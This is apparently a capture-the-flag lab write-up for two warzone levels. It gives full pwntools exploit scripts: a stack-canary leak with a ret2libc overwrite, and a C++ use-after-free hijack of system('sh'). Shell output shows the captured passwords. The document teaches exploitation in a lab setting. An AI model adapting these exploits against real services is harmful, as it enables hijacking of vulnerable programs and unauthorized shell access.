lab9C
–> Leak the stack canary (index 257).
–> Leak the return address of main (index 261).
–> Calculate the address of system and string "/bin/sh".
–> Store 256 values.
–> Store the stack canary (first overflowing value).
–> Store another 3 values (offset to return address).
–> Store address of system (overwrite return address).
–> Store another value (return address after call to system).
–> Store address of string "/bin/sh" (argument for system).
–> Choose 3. Quit to trigger ret instruction.

from pwn import *
 
def append(p, x):
  p.sendline("1")
  p.sendline(str(x))
  p.recv(1000)
   
def leak(p, x):
  p.sendline("2")
  p.sendline(str(x))
  p.recvuntil(str(x)+"] = ")
  ret = p.recv(100)
  leak = int(ret[0:ret.index("\n")], 10)
  if (leak < 0): leak = -((leak-1)^0xffffffff)
  return leak
 
 
p = remote("localhost", 9943)
p.recv(1000)
 
# leak stack canary
stack_can = leak(p, 257)
log.success("stack_canary: " + hex(stack_can))
 
# leak stack canary + 3 dword + return address
leak = leak(p, 261)
log.success("leak: " + hex(leak))
 
addr_system = leak + 0x2670d
addr_binsh  = leak + 0x146fa1
 
for i in range(256):
  append(p, 1337)
 
append(p, stack_can)
 
for i in range(3):
  append(p, 1337)
 
append(p, addr_system)
append(p, 1337)
append(p, addr_binsh)
 
p.sendline("3")
p.recv(1000)
 
p.interactive()

Running the script:
lab9C@warzone:/levels/lab09$ python3 /tmp/9C.py
[+] Opening connection to localhost on port 9943: Done
[+] stack_canary: 0x2c50f100
[+] leak: 0xb7460a83
[*] Switching to interactive mode
$ id
uid=1034(lab9A) gid=1035(lab9A) groups=1035(lab9A),1001(gameuser)
$ cat /home/lab9A/.pass
1_th0uGht_th4t_w4rn1ng_wa5_l4m3

lab9A

The keywords new and delete are the C++ equivalents to the C-functions malloc and free. As we have already seen in lab7C an application might be prone to a Use After Free vulnerability if a pointer is not set to NULL after the memory it is pointing to has been deallocated. This is true for both malloc and delete. Within the above code in the function do_del_set the memory allocated for the hashset_int instance is freed but the pointer within the array set_vec still references the deallocated memory (line 159

from pwn import *
 
 
def open(p, idx, size):
  p.sendline("1")
  p.sendline(str(idx))
  p.sendline(str(size))
  p.recv(1000)
 
 
def delete(p, idx):
  p.sendline("4")
  p.sendline(str(idx))
  p.recv(1000)
 
 
def add(p, idx, val):
  p.sendline("2")
  p.sendline(str(idx))
  p.sendline(str(val))
  p.recv(1000)
 
 
def get(p, idx, val):
  p.sendline("3")
  p.sendline(str(idx))
  p.sendline(str(val))
  p.recvuntil("lockbox["+str(val)+"] = ")
  ret = p.recv(1000)
  ret = ret[0:ret.index("\n")]
  ret = int(ret, 10)
  if (ret < 0): ret = -((ret-1)^0xffffffff) # value might be negative in two's complement
  return ret
 
 
p = remote("localhost", 9941)
p.recv(1000)
 
open(p, 0, 20)
open(p, 1, 20)
delete(p, 1)
delete(p, 0)
open(p, 0, 4)
open(p, 2, 4)

leak_libc = get(p, 2, 0)
log.success("leak_libc: " + hex(leak_libc))

leak_heap = get(p, 0, 3)
log.success("leak_heap: " + hex(leak_heap)) # leak heap_base + 0xb8

add(p, 2, leak_libc - 0x16a2c0) # leak_libc is at offset 0x16a2c0 from system
 

add(p, 0, leak_heap - 0x58 - 0xc)

add(p, 0, 0x61616161) # "aaaa"
add(p, 0, 0x7c7c2032) # "2 ||"
add(p, 0, 0x00006873) # "sh"
 

p.sendline("3\n1\n0")
p.recvuntil("Item value: ")
 
p.interactive()

Running the script:
lab9A@warzone:/levels/lab09$ python3 /tmp/9A.py
[+] Opening connection to localhost on port 9941: Done
[+] leak_libc: 0xb766b450
[+] leak_heap: 0x8f4e0b8
[*] Switching to interactive mode
$ id
uid=1035(lab9end) gid=1036(lab9end) groups=1036(lab9end),1001(gameuser)
$ cat /home/lab9end/.pass
1_d1dNt_3v3n_n33d_4_Hilti_DD350



